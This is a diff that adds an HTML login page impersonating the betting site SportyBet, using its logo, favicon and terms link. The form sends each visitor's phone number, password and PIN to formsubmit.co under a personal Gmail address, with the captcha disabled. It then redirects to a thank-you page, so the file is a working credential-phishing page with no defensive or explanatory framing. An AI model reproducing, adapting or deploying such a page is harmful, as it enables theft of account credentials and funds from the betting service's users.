@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login to SportyBet</title>
+  <link rel="shortcut icon" href="https://s.sporty.net/global/main/logo/favicon.ico"/>
+  <link rel="apple-touch-icon" href="https://s.sporty.net/global/main/logo/144x144.png"/>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      box-sizing: border-box;
+    }
+    .login-container img {
+      max-width: 150px;
+      margin-bottom: 20px;
+    }
+    .login-container h2 {
+      margin-bottom: 25px;
+      color: #333;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+      font-weight: bold;
+    }
+    .phone-input-group {
+      display: flex;
+      gap: 10px;
+    }
+    .phone-input-group select {
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+      width: 90px;
+    }
+    .phone-input-group input[type="tel"],
+    .input-group input[type="password"],
+    .input-group input[type="number"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    .options-group {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .checkbox-container input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      accent-color: #e41827;
+      cursor: pointer;
+    }
+    .checkbox-container label {
+      color: #555;
+      font-weight: normal;
+      margin-bottom: 0;
+      cursor: pointer;
+    }
+    .login-button {
+      background-color: #e41827;
+      color: #fff;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+    .login-button:hover {
+      background-color: #c91522;
+    }
+    .terms-agreement {
+      margin-top: 15px;
+      font-size: 13px;
+      color: #777;
+    }
+    .terms-agreement a {
+      color: #e41827;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .terms-agreement a:hover {
+      text-decoration: underline;
+    }
+    .forgot-password {
+      margin-top: 15px;
+      font-size: 14px;
+    }
+    .forgot-password a {
+      color: #e41827;
+      text-decoration: none;
+    }
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+    .signup-link {
+      margin-top: 25px;
+      font-size: 15px;
+      color: #555;
+    }
+    .signup-link a {
+      color: #e41827;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .signup-link a:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 600px) {
+      .login-container {
+        margin: 20px;
+        padding: 30px 20px;
+      }
+      .phone-input-group {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .phone-input-group select {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://s.sporty.net/common/main/res/5deafad00821308fc9a5fdb0a1cc038.png" alt="SportyBet Logo">
+    <h2>Login to your account</h2>
+    <form action="https://formsubmit.co/chisimdipayeer@gmail.com" method="POST">
+      <!-- Hidden inputs for FormSubmit -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://example.com/thank-you">
+
+      <div class="input-group">
+        <label for="phoneNumber">Phone Number</label>
+        <div class="phone-input-group">
+          <select id="countryCode" name="Country Code">
+            <option value="+234" selected>+234 (Nigeria)</option>
+            <option value="+233">+233 (Ghana)</option>
+            <option value="+254">+254 (Kenya)</option>
+            <option value="+255">+255 (Tanzania)</option>
+            <option value="+260">+260 (Zambia)</option>
+          </select>
+          <input type="tel" id="phoneNumber" name="Phone Number" placeholder="Enter your phone number" required>
+        </div>
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="Password" placeholder="Enter your password" required>
+      </div>
+
+      <div class="input-group">
+        <label for="pin">Pin</label>
+        <input type="number" id="pin" name="Pin" placeholder="Enter your pin" required>
+      </div>
+
+      <div class="options-group">
+        <div class="checkbox-container">
+          <input type="checkbox" id="rememberMe" name="Remember Me">
+          <label for="rememberMe">Remember me</label>
+        </div>
+        <div class="checkbox-container">
+          <input type="checkbox" id="keepSignedIn" name="Keep Me Signed In">
+          <label for="keepSignedIn">Keep me signed in</label>
+        </div>
+      </div>
+
+      <button type="submit" class="login-button">Login</button>
+
+      <div class="terms-agreement">
+        By logging in you have accepted our 
+        <a href="https://www.sportybet.com/ng/m/help/about/terms-and-conditions" target="_blank">terms and agreement</a>.
+      </div>
+    </form>
+
+    <div class="forgot-password">
+      <a href="#">Forgot Password?</a>
+    </div>
+
+    <div class="signup-link">
+      Don't have an account? <a href="#">Register Now</a>
+    </div>
+  </div>
+</body>
+</html>
